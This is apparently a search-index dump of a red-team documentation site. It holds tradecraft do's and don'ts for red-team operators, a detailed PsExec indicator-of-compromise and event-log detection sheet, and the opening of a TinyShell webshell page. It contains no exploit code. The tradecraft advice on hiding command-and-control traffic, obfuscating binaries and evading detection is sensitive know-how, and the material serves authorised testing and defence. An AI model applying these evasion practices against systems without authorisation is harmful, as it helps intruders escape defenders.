executives (and even some IT professionals). Screenshots before, during, and following the execution of an action hold much more weight than a terminal log, tool log, or operator log (often if may just be a screenshot of the terminal during execution). DO: CONSULT WITH PEERS \u00b6 No matter how long you have been performing IT or security, consult your peers before taking action. This is especially true during exploitation and command and control setup. Simple mistakes often lead to Red Team discovery too early in the engagement. Look at the command below. The command will be run as part of a tool written to provide general SA on a Linux system. What should the output look like? 1 netstat \u2013 antb The command above is a netstat command that can be executed on a Windows host. Linux does not have the \"b\" option and produces an \"invalid option\" response. Think about it Have you ever typed ifconfig instead of ipconfig? Have you ever typed rm * in the wrong directory? Have you ever entered credentials only to discover they were \"fat fingered\" (after access error)? While these are oversimplifications, they represent the need for peer review on tools, C2, setup, execution, and even clean up. DO: UNDERSTAND THE TOOLS AND TECHNOLOGIES USED \u00b6 Understand the underlying technology of a tool or technique before using it on an event. Know how the tool or technique interacts with a target, what network traffic it may generate, and what traces it may leave behind. Knowing what a tool does is only one-third of the equation. What does that mean exactly? Let\u2019s quickly look at a few questions and an example. What artifacts does the tool leave behind? - Are any files modified during execution? Are there tales in the network traffic? Now let\u2019s look at psexec (a commonly used tool, but not a recommended tool for Red Teaming a remote system) Depending on how psexec is executed it: Copies a service file to the remote system Enters a service key into the registry Creates a prefetch file Creates an entry in the Application Compatibility Cache - Creates a login event Creates a profile folder for the remote user Attempts to remove service file and key when exiting (not always successful) What happens when using the \u2013e option? \u2013s option? How does this differ from psexec for PowerShell? Psexec is not a bad tool, and Red Team operators will use it. But... it is important to understand the IOCs generated by a tool. Getting caught due to a lack of tool understanding is not something any Red Team operators wants to experience. DO: PERFORM SITUATIONAL AWARENESS \u00b6 After gaining access to a remote system perform situational awareness before moving on. Understand the environment you are in (Is the target in scope?) What protections exist on the system or network? What are the risks of being caught and what attack paths does the system provide? - Are there pre-established connections to other network resources? Who is into the system? Who has recently logged into the system? DO: MINIMIZE CALLBACK (C2) VOLUME \u00b6 Unless a Host Based protection mechanism is triggered, it is more likely to be discovered or caught by a defenders recognition and/or analysis of traffic on the network. To avoid early detection, it is always good tradecraft to limit the amount of traffic generated during the engagement. There are several general concepts that, if followed, increase the success of the engagement while decreasing the chances of being discovered: Keep traffic internal to a network: One of the most common issues, and one you should always attempt to change, are the limited number of sensors inside a network. Most network protections are currently applied at the boundary. Pivot command and control traffic to a minimal number of outbound sources: Maintain at least two outbound sources for C2 redundancy; however, only use one for operations (considered an interactive tier). The second (a long or short haul tier) is dormant or extremely slow to be used as a backup if/when the primary is discovered. DON\u2019T: USE UNTESTED TOOLS ON A TARGET SYSTEM \u00b6 Before using a new tool (script, application, binary, process, etc.) on a target system, it must be tested, undergo an internal vetting process and be added to an official toolset. Does the tool have negative impacts on specific versions of an OS? Works fine on Windows 7 but causes system error in Windows 8? Do you know if/what additional actions the tool performs? Tool creates a covert channel for use inside the network. This tool creates a private tunnel between host on a virtual interface; however, this creates a network conflict Ex: target net: 10.10.2.0/24, covert channel net: 10.10.2.0/24 - Hint: Don\u2019t use these! Does the tool try to call home for updates? At start or during a specific operation, the tool tries to poll home for updates This can trigger defensive alerts identifying unauthorized persons or software on the network Does the tool attempt to run as a specific user or, worse, create a user/group? Keep these questions in mind before executing untested or unknown tools. DON\u2019T: USE UNENCRYPTED CHANNELS FOR C2 \u00b6 Command and control data exiting the network must be encrypted. Clear text data, such as uploading a binary, issuing an operating system command or using a web shell will be detected by an IDS or other network defense if in clear text. It has become common for IPS/IDS to detect specific strings discovered in clear text traffic. For example: \"C:\\Windows\\System32\" has become a common trigger for investigation. Some defenders have even gone the extra mile in legitimizing a potential threat. Assume the defender uses a remote administration tool on a regular basis. Ignoring recommendation, this traffic is unencrypted. Rather than alert each time the tool is used legitimately, the alert is configured to look for inconsistencies in the text. For example: most attackers are accustomed to typing lowercase commands in windows. The defender ignores \"C:\\Windows\\System32\" but alerts on \"c:\\windows\\system32\" Encryption of internal C2 traffic depends upon several different factors: Are there sensors inside the network? Are there other encrypted communications occurring between target systems? Would encrypted traffic stand-out more than unencrypted traffic? Internal encryption is another example of where peers should be consulted to determine the best course of action before deploying C2 further into a network. DON\u2019T: ATTEMPT TO EXPLOIT OR ATTACK UNENCRYPTED WEBSITES \u00b6 As tempting as it may be, do not attack unencrypted websites. Simple attacks can trigger IDS. Always know your target IP space. There are likely several websites available for review. Proper reconnaissance and/or coordination should have discovered each. Create a list of sites in your target log. Include IP, URLs, an educated guess at the function, ports, protocols, etc. Important Note! Prior to performing any exploitation and attacks against a web server, refer to your rules of engagement and fully understand: Who actually owns the website? Who owns the system where the website is hosted? Who owns the backend application? Have proper approvals been obtained to test? DON\u2019T: EXECUTE FROM NON-EXECUTABLE LOCATIONS \u00b6 Execution on a Windows environment must occur in a location typical of windows. Executable locations such as c:\\programdata, c:\\progam files, c:\\windows are common. Execution for locations such as c:\\windows\\temp should never occur. DON\u2019T: USE BINARIES FOR INITIAL CAPABILITIES \u00b6 As a general rule, do not drop binaries on the system. Use built-in commands, such as PowerShell, to achieve your goals first. This is not always possible and binaries may be required; however, binaries must be vetted, obfuscated and tested against detection before use. Ensure all other \"Do\u2019s and Don\u2019ts\" are met for all binaries. Consult a senior operator before dropping any binary. DON\u2019T: DOWNLOAD RESTRICTED DATASETS \u00b6 NEVER download (or remove from the target network) any PII, HIPPA, PCI, or other restricted datasets. A good rule of thumb is to annotate the type of data, location, access method, and level of access of restricted data in the log. Ensure the log notes include a reference to the type of data discovered for quick reference. Take a screenshot of the displayed filename and location (assuming the file name has no restricted data included). If the operator can screenshot a portion of the dataset without capturing the restricted data, they may do so for proof-of-access; however, DO NOT take screenshots of the data itself!","title":"Tradecraft Guidance"},{"location":"redteaming/redteamplanning/tradecraft/#red-team-tradecraft-and-ttp-guidance","text":"This template should be used to define the overall guidance on Red Team Tradecraft and TTPs. Every Red Team should have a guidance document. Keep this document updated and distributed to all Red Team members. This document should be used to guide Red Team actions of all Red Team operators on all engagements. Exceptions to these rules can (and will) be made based on specific Rules of Engagement (ROE) or decision made by Red Team leads during an engagement. Exceptions should be documented as part of the engagement logging. It is important to use and follow this document to maintain a high-quality professional Red Team. Add custom or specific Tradecraft and TTP Guidance to this document as needed. This include specific or customs tools that should be used for various tasks, C2, enumeration, etc Guidance Do Don't Log all significant events Use untested tools on a target system Consult with peers Use unencrypted channels for C2 Understand tools and technology used Attempt to exploit or attack unencrypted websites Perform situational awareness Execute from non-executable locations Minimize callback (C2) volume Download restricted datasets Use binaries for initial access","title":"Red Team Tradecraft and TTP Guidance"},{"location":"redteaming/redteamplanning/tradecraft/#do-log-all-significant-actions","text":"(SUCCESSES AND FAILURES) Log, log and log some more! Screenshot all significant actions including successful and failed attempts. One of the most important aspects of the Red Team engagement is the collection of data (a.k.a. logs). It is common that an inexperienced team completes an engagement with subpar documentation. Many actions are not fully captured, some actions are never captured, and often key failures are ignored. Each action performed provides value to the target as well as the target defenders. Incomplete logs prevent the Red Team from providing a complete and accurate depiction of the actions, obstacles, and defensive strengths and weaknesses of the target (i.e. mission failure). There are several methods to ensure logs are appropriately captured and stored: - Automated logging of the terminal: All terminal actions logged, timestamped and stored to a predefined location. - Tool logs: Most commercial tools have some capability to log actions and produce a raw and/or final report. - Custom tools logs: If you write a custom tool/script, it should output a log of actions and results. - Operator logs: By far this is the most important log. A log may show the action performed and the result; however, only the operator can accurately note the way the action was performed, what lead them to the decision, and their interpretation of the result. - Screenshots: Terminal logs are great for the operator and even better as supporting artifacts; however, they may mean nothing to senior level executives (and even some IT professionals). Screenshots before, during, and following the execution of an action hold much more weight than a terminal log, tool log, or operator log (often if may just be a screenshot of the terminal during execution).","title":"DO: LOG ALL SIGNIFICANT ACTIONS"},{"location":"redteaming/redteamplanning/tradecraft/#do-consult-with-peers","text":"No matter how long you have been performing IT or security, consult your peers before taking action. This is especially true during exploitation and command and control setup. Simple mistakes often lead to Red Team discovery too early in the engagement. Look at the command below. The command will be run as part of a tool written to provide general SA on a Linux system. What should the output look like? 1 netstat \u2013 antb The command above is a netstat command that can be executed on a Windows host. Linux does not have the \"b\" option and produces an \"invalid option\" response. Think about it Have you ever typed ifconfig instead of ipconfig? Have you ever typed rm * in the wrong directory? Have you ever entered credentials only to discover they were \"fat fingered\" (after access error)? While these are oversimplifications, they represent the need for peer review on tools, C2, setup, execution, and even clean up.","title":"DO: CONSULT WITH PEERS"},{"location":"redteaming/redteamplanning/tradecraft/#do-understand-the-tools-and-technologies-used","text":"Understand the underlying technology of a tool or technique before using it on an event. Know how the tool or technique interacts with a target, what network traffic it may generate, and what traces it may leave behind. Knowing what a tool does is only one-third of the equation. What does that mean exactly? Let\u2019s quickly look at a few questions and an example. What artifacts does the tool leave behind? - Are any files modified during execution? Are there tales in the network traffic? Now let\u2019s look at psexec (a commonly used tool, but not a recommended tool for Red Teaming a remote system) Depending on how psexec is executed it: Copies a service file to the remote system Enters a service key into the registry Creates a prefetch file Creates an entry in the Application Compatibility Cache - Creates a login event Creates a profile folder for the remote user Attempts to remove service file and key when exiting (not always successful) What happens when using the \u2013e option? \u2013s option? How does this differ from psexec for PowerShell? Psexec is not a bad tool, and Red Team operators will use it. But... it is important to understand the IOCs generated by a tool. Getting caught due to a lack of tool understanding is not something any Red Team operators wants to experience.","title":"DO: UNDERSTAND THE TOOLS AND TECHNOLOGIES USED"},{"location":"redteaming/redteamplanning/tradecraft/#do-perform-situational-awareness","text":"After gaining access to a remote system perform situational awareness before moving on. Understand the environment you are in (Is the target in scope?) What protections exist on the system or network? What are the risks of being caught and what attack paths does the system provide? - Are there pre-established connections to other network resources? Who is into the system? Who has recently logged into the system?","title":"DO: PERFORM SITUATIONAL AWARENESS"},{"location":"redteaming/redteamplanning/tradecraft/#do-minimize-callback-c2-volume","text":"Unless a Host Based protection mechanism is triggered, it is more likely to be discovered or caught by a defenders recognition and/or analysis of traffic on the network. To avoid early detection, it is always good tradecraft to limit the amount of traffic generated during the engagement. There are several general concepts that, if followed, increase the success of the engagement while decreasing the chances of being discovered: Keep traffic internal to a network: One of the most common issues, and one you should always attempt to change, are the limited number of sensors inside a network. Most network protections are currently applied at the boundary. Pivot command and control traffic to a minimal number of outbound sources: Maintain at least two outbound sources for C2 redundancy; however, only use one for operations (considered an interactive tier). The second (a long or short haul tier) is dormant or extremely slow to be used as a backup if/when the primary is discovered.","title":"DO: MINIMIZE CALLBACK (C2) VOLUME"},{"location":"redteaming/redteamplanning/tradecraft/#dont-use-untested-tools-on-a-target-system","text":"Before using a new tool (script, application, binary, process, etc.) on a target system, it must be tested, undergo an internal vetting process and be added to an official toolset. Does the tool have negative impacts on specific versions of an OS? Works fine on Windows 7 but causes system error in Windows 8? Do you know if/what additional actions the tool performs? Tool creates a covert channel for use inside the network. This tool creates a private tunnel between host on a virtual interface; however, this creates a network conflict Ex: target net: 10.10.2.0/24, covert channel net: 10.10.2.0/24 - Hint: Don\u2019t use these! Does the tool try to call home for updates? At start or during a specific operation, the tool tries to poll home for updates This can trigger defensive alerts identifying unauthorized persons or software on the network Does the tool attempt to run as a specific user or, worse, create a user/group? Keep these questions in mind before executing untested or unknown tools.","title":"DON\u2019T: USE UNTESTED TOOLS ON A TARGET SYSTEM"},{"location":"redteaming/redteamplanning/tradecraft/#dont-use-unencrypted-channels-for-c2","text":"Command and control data exiting the network must be encrypted. Clear text data, such as uploading a binary, issuing an operating system command or using a web shell will be detected by an IDS or other network defense if in clear text. It has become common for IPS/IDS to detect specific strings discovered in clear text traffic. For example: \"C:\\Windows\\System32\" has become a common trigger for investigation. Some defenders have even gone the extra mile in legitimizing a potential threat. Assume the defender uses a remote administration tool on a regular basis. Ignoring recommendation, this traffic is unencrypted. Rather than alert each time the tool is used legitimately, the alert is configured to look for inconsistencies in the text. For example: most attackers are accustomed to typing lowercase commands in windows. The defender ignores \"C:\\Windows\\System32\" but alerts on \"c:\\windows\\system32\" Encryption of internal C2 traffic depends upon several different factors: Are there sensors inside the network? Are there other encrypted communications occurring between target systems? Would encrypted traffic stand-out more than unencrypted traffic? Internal encryption is another example of where peers should be consulted to determine the best course of action before deploying C2 further into a network.","title":"DON\u2019T: USE UNENCRYPTED CHANNELS FOR C2"},{"location":"redteaming/redteamplanning/tradecraft/#dont-attempt-to-exploit-or-attack-unencrypted-websites","text":"As tempting as it may be, do not attack unencrypted websites. Simple attacks can trigger IDS. Always know your target IP space. There are likely several websites available for review. Proper reconnaissance and/or coordination should have discovered each. Create a list of sites in your target log. Include IP, URLs, an educated guess at the function, ports, protocols, etc. Important Note! Prior to performing any exploitation and attacks against a web server, refer to your rules of engagement and fully understand: Who actually owns the website? Who owns the system where the website is hosted? Who owns the backend application? Have proper approvals been obtained to test?","title":"DON\u2019T: ATTEMPT TO EXPLOIT OR ATTACK UNENCRYPTED WEBSITES"},{"location":"redteaming/redteamplanning/tradecraft/#dont-execute-from-non-executable-locations","text":"Execution on a Windows environment must occur in a location typical of windows. Executable locations such as c:\\programdata, c:\\progam files, c:\\windows are common. Execution for locations such as c:\\windows\\temp should never occur.","title":"DON\u2019T: EXECUTE FROM NON-EXECUTABLE LOCATIONS"},{"location":"redteaming/redteamplanning/tradecraft/#dont-use-binaries-for-initial-capabilities","text":"As a general rule, do not drop binaries on the system. Use built-in commands, such as PowerShell, to achieve your goals first. This is not always possible and binaries may be required; however, binaries must be vetted, obfuscated and tested against detection before use. Ensure all other \"Do\u2019s and Don\u2019ts\" are met for all binaries. Consult a senior operator before dropping any binary.","title":"DON\u2019T: USE BINARIES FOR INITIAL CAPABILITIES"},{"location":"redteaming/redteamplanning/tradecraft/#dont-download-restricted-datasets","text":"NEVER download (or remove from the target network) any PII, HIPPA, PCI, or other restricted datasets. A good rule of thumb is to annotate the type of data, location, access method, and level of access of restricted data in the log. Ensure the log notes include a reference to the type of data discovered for quick reference. Take a screenshot of the displayed filename and location (assuming the file name has no restricted data included). If the operator can screenshot a portion of the dataset without capturing the restricted data, they may do so for proof-of-access; however, DO NOT take screenshots of the data itself!","title":"DON\u2019T: DOWNLOAD RESTRICTED DATASETS"},{"location":"redteaming/tool_ioc/psexec/","text":"PsExec.exe IOCs and Detection \u00b6 PsExec.exe is a tool commonly used by system administrators, penetration testers, and threat actors. It is important to understand what indicators a tool may leave behind before using on a Red Team engagement. This document highlights key IOCs generated when the SysInternals version of PsExec SysInternals PsExec is used. This is just only procedure of a larger set of techiques. Most variations of this technique share similar IOCs. MITRE TTP \u00b6 MITRE Technique T1035 MITRE TTP Tatic Execution Technique Service Execution Procedure Use PsExec.exe to execute commands on a remote Windows system Category \u00b6 Command Execution Description \u00b6 Executes a command on a remote host. Example of Presumed Tool Use During an Attack \u00b6 The tool is used to execute a remote command on hosts and servers in a domain. Tool Operation Overview \u00b6 Item Description OS Windows Belongs to Domain Not required Rights Standard User / Administrator Communication Protocol - 88/tcp (when executing in a domain environment) - 135/tcp - 445/tcp - Random High Port Information Acquired from Log \u00b6 Standard Settings Source host - A registry value created when the PsExec License Agreement has been agreed to (registry). - Execution history (Prefetch) Destination Host - The fact that the PSEXESVC service has been installed, started, and ended is recorded (system log). - Execution history (Prefetch) Additional Settings Source host - The fact that the PsExec process was executed and that connection was made to the destination via the network, as well as the command name and argument for a remotely executed command are recorded (audit policy, Sysmon). Destination Host - The fact that PSEXESVC.exe was created and accessed, and that connection was made from the source via the network, as well as the command name and argument for a remotely executed command are recorded (audit policy, Sysmon). Packet Capture - Transmission of PSEXESVC and its output file (-stdin, -stdout, -stderr) with SMB2. Evidence That Can Be Confirmed When Execution is Successful \u00b6 Source Host The Event ID 4689 (A process has exited) indicating that psexec.exe was executed and has exited, was recorded in the event log \"Security\" with the execution result (return value) of \"0x0\". Destination host In the Event ID: 7045 of the event log \"System\", the fact that the PSEXESVC service was installed is recorded. Main Information Recorded at Execution \u00b6 Source Host \u00b6 Event Log Log Event ID Task Category Event Details Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. CommandLine:__ Command line of the execution command ([Path to Executable File] [Execution Command]) UtcTime:__ Process execution date and time (UTC) ProcessGuid/ProcessId: Process ID Image: Path to the executable file (path to the executable file) User: Execute as user Microsoft-Windows-Sysmon/Operationa 3 Network connection detected (rule: NetworkConnect) Network Connection Detected: Protocol: Protocol (tcp) Image: Path to the executable file (System) ProcessGuid/ProcessId: Process ID (4) User: Execute as user (NT_AUTHORITY\\SYSTEM) SourceIp/SourceHostname/SourcePort: Source IP address/Host name/Port number (source host) DestinationIp/DestinationHostname/DestinationPort: Destination IP address/Host name/Port number (destination ports: 135 and 445, high port) Microsoft-Windows-Sysmon/Operationa 13 Registry value set (rule: RegistryEvent) Registry value set. Image: Path to the executable file (path to the tool) ProcessGuid/ProcessId: Process ID Details: Setting value written to the registry (DWORD: 0x00000001) TargetObject: Registry value at the write destination (\\REGISTRY\\USER[User SID]\\SOFTWARE\\Sysinternals\\PsExec\\EulaAccepted) Security 4689 Process Termination A process has exited. Log Date and Time: Process terminated date and time (local time)Process Information > Exit Status:__ Process return value (0x0) Subject > Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Process Information > Process Name: Path to the executable file (path to the tool) Prefetch C:\\Windows\\Prefetch[Executable File Name of Tool]-[RANDOM].pf Registry Registry entry Key: HKEY_USERS[User SID]\\SOFTWARE\\Sysinternals\\PsExec\\EulaAccepted Value: 0x00000001 Destination Host \u00b6 Log Event ID Task Category Event Details Security 5145 Detailed File Share A network share object was checked to see whether the client can be granted the desired access. Shared Information > Share Name: Share name (\\*\\ADMIN$) Subject > Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Shared Information > Share Path: Share path (\\??\\C:\\Windows) Shared Information > Relative Target Name: Relative target name from the share path (PSEXESVC.exe) Access Request Information > Access: Requested privileges (including WriteData or AddFile, and AppendData) Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. ParentImage: Executable file of the parent process (C:\\Windows\\system32\\services.exe) CommandLine: Command line of the execution command ParentCommandLine: Command line of the parent process (C:\\Windows\\system32\\services.exe) UtcTime: Process execution date and time (UTC) ProcessGuid/ProcessId: Process IDUser: Execute as user (NT AUTHORITY\\SYSTEM) Image: Path to the executable file (C:\\Windows\\PSEXESVC.exe) System 7045 A service was installed in the system. A service was installed. Service start type: Operation of trigger that starts the service (demand start) Service account: Executing account (LocalSystem) Service type: Type of the service to be executed (user mode service) Service Name: Name displayed in the service list (PSEXESVC) Service File Name: Service executable file (%SystemRoot%\\PSEXESVC.exe) Security 5145 Detailed File Share A network share object was checked to see whether the client can be granted the desired access. Shared Information > Share Name: Share name (\\*\\IPC$) Subject > Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Shared Information > Relative Target Name: Relative target name from the share path (PSEXESVC-[Source Host Name]-[Source Process ID]-[stdin, stdout, stderr]) Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. ParentProcessGuid/ParentProcessId: Process ID of the parent process ParentImage: Executable file of the parent process (C:\\Windows\\PSEXESVC.exe) Image: Path to the executable file (Path to the executable file that was executed by PsExec) ParentCommandLine: Command line of the parent process (C:\\Windows\\PSEXESVC.exe) UtcTime: Process execution date and time (UTC) ProcessGuid/ProcessId: Process ID System 7036 Service Control Manager The [Service Name] service entered the [Status] state. Status: State after the transition (Stopped) Service Name: Target service name (PSEXESVC) Security 4689 Process Termination A process has exited. Log Date and Time: Process terminated date and time (local time) Process Information > Exit Status: Process return value (0x0) Process Information > Process Name: Path to the executable file (C:\\Windows\\PSEXESVC.exe) Security 4674 Sensitive Privilege Use An operation was attempted on a privileged object. Subject > Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Object > Object Name: Name of the object to be processed (PSEXESVC) Object > Object Server: Service that executed the process (SC Manager) Requested operation > Privileges: Requested privilege (DELETE) Process Information > Process Name: Path to the executable file (C:\\Windows\\System32\\services.exe) Object > Object Type: Type of the object to be processed (SERVICE OBJECT) Microsoft-Windows-Sysmon/Operational 11 File created (rule: FileCreate) File created. Image: Path to the executable file (C:\\Windows\\System32\\svchost.exe) ProcessGuid/ProcessId: Process IDTarget Filename: Created file (C:\\Windows\\Prefetch\\PSEXECSVC.EXE-[Random Number].pf)Creation UtcTime: File creation date and time (UTC) USN Journal \u00b6 File Name Process PSEXESVC.exe FILE_CREATE PSEXESVC.exe DATA_EXTEND+FILE_CREATE PSEXESVC.exe CLOSE+DATA_EXTEND+FILE_CREATE PSEXESVC.EXE-[RANDOM].pf FILE_CREATE PSEXESVC.EXE-[RANDOM].pf DATA_EXTEND+FILE_CREATE PSEXESVC.EXE-[RANDOM].pf CLOSE+DATA_EXTEND+FILE_CREATE PSEXESVC.exe CLOSE+FILE_DELETE Prefetch \u00b6 C :\\ Windows \\ Prefetch \\ PSEXESVC . EXE - [ RANDOM ]. pf Interesting Events \u00b6 References \u00b6 JPCERT - Research Report Released: Detecting Lateral Movement through Tracking Event Logs https://blog.jpcert.or.jp/2017/06/1-ae0d.html MITRE ATT&CK - Technique T1035 https://attack.mitre.org/wiki/Technique/T1035 JPCERT Tool Analysis Results https://jpcertcc.github.io/ToolAnalysisResultSheet/ JPCERT Tool Analysis Results - PsExec https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PsExec.htm","title":"PSEXEC IOCs"},{"location":"redteaming/tool_ioc/psexec/#psexecexe-iocs-and-detection","text":"PsExec.exe is a tool commonly used by system administrators, penetration testers, and threat actors. It is important to understand what indicators a tool may leave behind before using on a Red Team engagement. This document highlights key IOCs generated when the SysInternals version of PsExec SysInternals PsExec is used. This is just only procedure of a larger set of techiques. Most variations of this technique share similar IOCs.","title":"PsExec.exe IOCs and Detection"},{"location":"redteaming/tool_ioc/psexec/#mitre-ttp","text":"MITRE Technique T1035 MITRE TTP Tatic Execution Technique Service Execution Procedure Use PsExec.exe to execute commands on a remote Windows system","title":"MITRE TTP"},{"location":"redteaming/tool_ioc/psexec/#category","text":"Command Execution","title":"Category"},{"location":"redteaming/tool_ioc/psexec/#description","text":"Executes a command on a remote host.","title":"Description"},{"location":"redteaming/tool_ioc/psexec/#example-of-presumed-tool-use-during-an-attack","text":"The tool is used to execute a remote command on hosts and servers in a domain.","title":"Example of Presumed Tool Use During an Attack"},{"location":"redteaming/tool_ioc/psexec/#tool-operation-overview","text":"Item Description OS Windows Belongs to Domain Not required Rights Standard User / Administrator Communication Protocol - 88/tcp (when executing in a domain environment) - 135/tcp - 445/tcp - Random High Port","title":"Tool Operation Overview"},{"location":"redteaming/tool_ioc/psexec/#information-acquired-from-log","text":"Standard Settings Source host - A registry value created when the PsExec License Agreement has been agreed to (registry). - Execution history (Prefetch) Destination Host - The fact that the PSEXESVC service has been installed, started, and ended is recorded (system log). - Execution history (Prefetch) Additional Settings Source host - The fact that the PsExec process was executed and that connection was made to the destination via the network, as well as the command name and argument for a remotely executed command are recorded (audit policy, Sysmon). Destination Host - The fact that PSEXESVC.exe was created and accessed, and that connection was made from the source via the network, as well as the command name and argument for a remotely executed command are recorded (audit policy, Sysmon). Packet Capture - Transmission of PSEXESVC and its output file (-stdin, -stdout, -stderr) with SMB2.","title":"Information Acquired from Log"},{"location":"redteaming/tool_ioc/psexec/#evidence-that-can-be-confirmed-when-execution-is-successful","text":"Source Host The Event ID 4689 (A process has exited) indicating that psexec.exe was executed and has exited, was recorded in the event log \"Security\" with the execution result (return value) of \"0x0\". Destination host In the Event ID: 7045 of the event log \"System\", the fact that the PSEXESVC service was installed is recorded.","title":"Evidence That Can Be Confirmed When Execution is Successful"},{"location":"redteaming/tool_ioc/psexec/#main-information-recorded-at-execution","text":"","title":"Main Information Recorded at Execution"},{"location":"redteaming/tool_ioc/psexec/#source-host","text":"Event Log Log Event ID Task Category Event Details Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. CommandLine:__ Command line of the execution command ([Path to Executable File] [Execution Command]) UtcTime:__ Process execution date and time (UTC) ProcessGuid/ProcessId: Process ID Image: Path to the executable file (path to the executable file) User: Execute as user Microsoft-Windows-Sysmon/Operationa 3 Network connection detected (rule: NetworkConnect) Network Connection Detected: Protocol: Protocol (tcp) Image: Path to the executable file (System) ProcessGuid/ProcessId: Process ID (4) User: Execute as user (NT_AUTHORITY\\SYSTEM) SourceIp/SourceHostname/SourcePort: Source IP address/Host name/Port number (source host) DestinationIp/DestinationHostname/DestinationPort: Destination IP address/Host name/Port number (destination ports: 135 and 445, high port) Microsoft-Windows-Sysmon/Operationa 13 Registry value set (rule: RegistryEvent) Registry value set. Image: Path to the executable file (path to the tool) ProcessGuid/ProcessId: Process ID Details: Setting value written to the registry (DWORD: 0x00000001) TargetObject: Registry value at the write destination (\\REGISTRY\\USER[User SID]\\SOFTWARE\\Sysinternals\\PsExec\\EulaAccepted) Security 4689 Process Termination A process has exited. Log Date and Time: Process terminated date and time (local time)Process Information > Exit Status:__ Process return value (0x0) Subject > Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Process Information > Process Name: Path to the executable file (path to the tool) Prefetch C:\\Windows\\Prefetch[Executable File Name of Tool]-[RANDOM].pf Registry Registry entry Key: HKEY_USERS[User SID]\\SOFTWARE\\Sysinternals\\PsExec\\EulaAccepted Value: 0x00000001","title":"Source Host"},{"location":"redteaming/tool_ioc/psexec/#destination-host","text":"Log Event ID Task Category Event Details Security 5145 Detailed File Share A network share object was checked to see whether the client can be granted the desired access. Shared Information > Share Name: Share name (\\*\\ADMIN$) Subject > Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Shared Information > Share Path: Share path (\\??\\C:\\Windows) Shared Information > Relative Target Name: Relative target name from the share path (PSEXESVC.exe) Access Request Information > Access: Requested privileges (including WriteData or AddFile, and AppendData) Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. ParentImage: Executable file of the parent process (C:\\Windows\\system32\\services.exe) CommandLine: Command line of the execution command ParentCommandLine: Command line of the parent process (C:\\Windows\\system32\\services.exe) UtcTime: Process execution date and time (UTC) ProcessGuid/ProcessId: Process IDUser: Execute as user (NT AUTHORITY\\SYSTEM) Image: Path to the executable file (C:\\Windows\\PSEXESVC.exe) System 7045 A service was installed in the system. A service was installed. Service start type: Operation of trigger that starts the service (demand start) Service account: Executing account (LocalSystem) Service type: Type of the service to be executed (user mode service) Service Name: Name displayed in the service list (PSEXESVC) Service File Name: Service executable file (%SystemRoot%\\PSEXESVC.exe) Security 5145 Detailed File Share A network share object was checked to see whether the client can be granted the desired access. Shared Information > Share Name: Share name (\\*\\IPC$) Subject > Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Shared Information > Relative Target Name: Relative target name from the share path (PSEXESVC-[Source Host Name]-[Source Process ID]-[stdin, stdout, stderr]) Microsoft-Windows-Sysmon/Operational 1 Process Create (rule: ProcessCreate) Process Create. ParentProcessGuid/ParentProcessId: Process ID of the parent process ParentImage: Executable file of the parent process (C:\\Windows\\PSEXESVC.exe) Image: Path to the executable file (Path to the executable file that was executed by PsExec) ParentCommandLine: Command line of the parent process (C:\\Windows\\PSEXESVC.exe) UtcTime: Process execution date and time (UTC) ProcessGuid/ProcessId: Process ID System 7036 Service Control Manager The [Service Name] service entered the [Status] state. Status: State after the transition (Stopped) Service Name: Target service name (PSEXESVC) Security 4689 Process Termination A process has exited. Log Date and Time: Process terminated date and time (local time) Process Information > Exit Status: Process return value (0x0) Process Information > Process Name: Path to the executable file (C:\\Windows\\PSEXESVC.exe) Security 4674 Sensitive Privilege Use An operation was attempted on a privileged object. Subject > Security ID/Account Name/Account Domain: SID/Account name/Domain of the user who executed the tool Object > Object Name: Name of the object to be processed (PSEXESVC) Object > Object Server: Service that executed the process (SC Manager) Requested operation > Privileges: Requested privilege (DELETE) Process Information > Process Name: Path to the executable file (C:\\Windows\\System32\\services.exe) Object > Object Type: Type of the object to be processed (SERVICE OBJECT) Microsoft-Windows-Sysmon/Operational 11 File created (rule: FileCreate) File created. Image: Path to the executable file (C:\\Windows\\System32\\svchost.exe) ProcessGuid/ProcessId: Process IDTarget Filename: Created file (C:\\Windows\\Prefetch\\PSEXECSVC.EXE-[Random Number].pf)Creation UtcTime: File creation date and time (UTC)","title":"Destination Host"},{"location":"redteaming/tool_ioc/psexec/#usn-journal","text":"File Name Process PSEXESVC.exe FILE_CREATE PSEXESVC.exe DATA_EXTEND+FILE_CREATE PSEXESVC.exe CLOSE+DATA_EXTEND+FILE_CREATE PSEXESVC.EXE-[RANDOM].pf FILE_CREATE PSEXESVC.EXE-[RANDOM].pf DATA_EXTEND+FILE_CREATE PSEXESVC.EXE-[RANDOM].pf CLOSE+DATA_EXTEND+FILE_CREATE PSEXESVC.exe CLOSE+FILE_DELETE","title":"USN Journal"},{"location":"redteaming/tool_ioc/psexec/#prefetch","text":"C :\\ Windows \\ Prefetch \\ PSEXESVC . EXE - [ RANDOM ]. pf","title":"Prefetch"},{"location":"redteaming/tool_ioc/psexec/#interesting-events","text":"","title":"Interesting Events"},{"location":"redteaming/tool_ioc/psexec/#references","text":"JPCERT - Research Report Released: Detecting Lateral Movement through Tracking Event Logs https://blog.jpcert.or.jp/2017/06/1-ae0d.html MITRE ATT&CK - Technique T1035 https://attack.mitre.org/wiki/Technique/T1035 JPCERT Tool Analysis Results https://jpcertcc.github.io/ToolAnalysisResultSheet/ JPCERT Tool Analysis Results - PsExec https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PsExec.htm","title":"References"},{"location":"redteaming/tool_ioc/tinyshell_ioc/","text":"TinyShell IOCs \u00b6 TinyShell is a python command shell used to control and excute commands through HTTP requests to a webshell. TinyShell acts as the interface to the remote webshells. TinyShell is based on it's companion project SubShell ( https://github.com/minisllc/subshell ) and the China Chopper Webshell ( 